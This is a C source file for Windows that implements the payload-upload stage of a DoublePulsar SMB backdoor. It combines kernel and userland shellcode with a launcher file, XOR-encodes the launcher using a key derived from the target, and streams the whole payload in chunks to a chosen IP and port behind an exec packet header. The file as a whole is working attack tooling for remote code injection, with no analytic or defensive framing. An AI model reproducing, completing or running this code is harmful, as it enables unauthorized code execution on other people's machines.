#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port);
void xor_buffer(unsigned char *data, size_t len, unsigned int key);
int smb_send(int sock, const unsigned char *data, size_t len);

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    unsigned char *launcher = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    size_t launcher_size;
    size_t part1_size = sizeof(KERNEL_SHELLCODE_X64_PART1);
    size_t part2_size = sizeof(KERNEL_SHELLCODE_X64_PART2);
    size_t userland_size = sizeof(USERLAND_SHELLCODE_X64);
    size_t payload_size;
    size_t packet_header_size = sizeof(DP_EXEC_PKT);
    size_t offset;
    size_t chunk_size;
    DWORD bytes_read;
    unsigned int xor_key;
    uint32_t process_hash = (uint32_t)TARGET_PROCESS_HASH;
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_storage address;
    int address_length;
    int wsa_started = 0;
    int result = -1;
    size_t i;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535 ||
        SMB_CHUNK_SIZE == 0 || SMB_CHUNK_SIZE > SIZE_MAX - packet_header_size) {
        return -1;
    }

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX) {
        goto cleanup;
    }
    launcher_size = (size_t)file_size.QuadPart;
    if (launcher_size == 0) {
        goto cleanup;
    }

    launcher = (unsigned char *)malloc(launcher_size);
    if (launcher == NULL) {
        goto cleanup;
    }

    offset = 0;
    while (offset < launcher_size) {
        DWORD request = launcher_size - offset > (size_t)MAXDWORD
                            ? MAXDWORD
                            : (DWORD)(launcher_size - offset);
        if (!ReadFile(file, launcher + offset, request, &bytes_read, NULL) ||
            bytes_read == 0) {
            goto cleanup;
        }
        offset += bytes_read;
    }

    if (!CloseHandle(file)) {
        file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file = INVALID_HANDLE_VALUE;

    if (part1_size > SIZE_MAX - sizeof(process_hash) ||
        part1_size + sizeof(process_hash) > SIZE_MAX - part2_size ||
        part1_size + sizeof(process_hash) + part2_size > SIZE_MAX - userland_size ||
        part1_size + sizeof(process_hash) + part2_size + userland_size > SIZE_MAX - launcher_size) {
        goto cleanup;
    }
    payload_size = part1_size + sizeof(process_hash) + part2_size +
                   userland_size + launcher_size;

    payload = (unsigned char *)malloc(payload_size);
    if (payload == NULL) {
        goto cleanup;
    }

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1, part1_size);
    offset += part1_size;
    payload[offset++] = (unsigned char)(process_hash & 0xffU);
    payload[offset++] = (unsigned char)((process_hash >> 8) & 0xffU);
    payload[offset++] = (unsigned char)((process_hash >> 16) & 0xffU);
    payload[offset++] = (unsigned char)((process_hash >> 24) & 0xffU);
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2, part2_size);
    offset += part2_size;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64, userland_size);
    offset += userland_size;

    xor_key = DoublePulsarXORKeyCalculator(ip, port);
    xor_buffer(launcher, launcher_size, xor_key);
    memcpy(payload + offset, launcher, launcher_size);

    memset(&address, 0, sizeof(address));
    if (InetPtonA(AF_INET, ip, &((struct sockaddr_in *)&address)->sin_addr) == 1) {
        struct sockaddr_in *ipv4 = (struct sockaddr_in *)&address;
        ipv4->sin_family = AF_INET;
        ipv4->sin_port = htons((u_short)port);
        address_length = sizeof(*ipv4);
    } else if (InetPtonA(AF_INET6, ip, &((struct sockaddr_in6 *)&address)->sin6_addr) == 1) {
        struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)&address;
        ipv6->sin6_family = AF_INET6;
        ipv6->sin6_port = htons((u_short)port);
        address_length = sizeof(*ipv6);
    } else {
        goto cleanup;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        goto cleanup;
    }
    wsa_started = 1;

    sock = socket(((struct sockaddr *)&address)->sa_family, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET || (uint64_t)sock > (uint64_t)INT_MAX) {
        goto cleanup;
    }
    if (connect(sock, (struct sockaddr *)&address, address_length) == SOCKET_ERROR) {
        goto cleanup;
    }

    if (packet_header_size > SIZE_MAX - (size_t)SMB_CHUNK_SIZE) {
        goto cleanup;
    }
    packet = (unsigned char *)malloc(packet_header_size + (size_t)SMB_CHUNK_SIZE);
    if (packet == NULL) {
        goto cleanup;
    }

    offset = 0;
    while (offset < payload_size) {
        chunk_size = payload_size - offset;
        if (chunk_size > (size_t)SMB_CHUNK_SIZE) {
            chunk_size = (size_t)SMB_CHUNK_SIZE;
        }
        memcpy(packet, DP_EXEC_PKT, packet_header_size);
        memcpy(packet + packet_header_size, payload + offset, chunk_size);
        if (smb_send((int)sock, packet, packet_header_size + chunk_size) < 0) {
            goto cleanup;
        }
        offset += chunk_size;
    }

    result = 0;

cleanup:
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if (wsa_started) {
        WSACleanup();
    }
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    if (packet != NULL) {
        free(packet);
    }
    if (payload != NULL) {
        free(payload);
    }
    if (launcher != NULL) {
        free(launcher);
    }
    return result;
}